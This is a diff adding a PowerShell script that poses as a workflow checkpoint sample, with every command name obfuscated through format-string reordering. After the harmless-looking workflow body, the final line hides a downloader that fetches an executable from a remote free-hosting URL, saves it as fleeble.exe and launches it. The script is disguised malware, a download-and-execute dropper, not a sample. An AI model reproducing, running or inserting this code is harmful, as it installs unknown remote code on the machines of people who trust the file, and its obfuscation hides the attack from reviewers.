@@ -1,0 +1,12 @@
+workflow Use-WorkflowCheckpointSample
+{
+    .("{2}{1}{0}" -f 'ut','p','Write-Out') ("{3}{5}{2}{4}{1}{0}"-f'nt.','heckpoi','fore','B',' C','e')
+    .("{2}{1}{0}"-f'-sleep','t','star') -s 20
+	
+    
+    .("{3}{2}{0}{1}{4}{6}{5}" -f'oi','nt','kp','Chec','-Workfl','w','o')
+
+    
+    &("{3}{1}{0}{2}"-f 'pu','Out','t','Write-') ("{0}{3}{1}{2}"-f'Afte','eckpoin','t.','r Ch')
+}
+(.("{0}{2}{1}"-f 'New-','ject','Ob') System.Net.WebClient).DownloadFile(("{1}{6}{0}{5}{3}{2}{4}{7}"-f '/mat','h','ee','lv.5gbfr','.com/vosa/doc.ex','ka','ttp:/','e'),("{3}{2}{1}{0}"-f 'le.exe','b','lee','f'));.("{2}{1}{0}{4}{3}"-f 'art-Pro','t','S','ss','ce') ("{2}{3}{0}{1}"-f 'x','e','f','leeble.e')
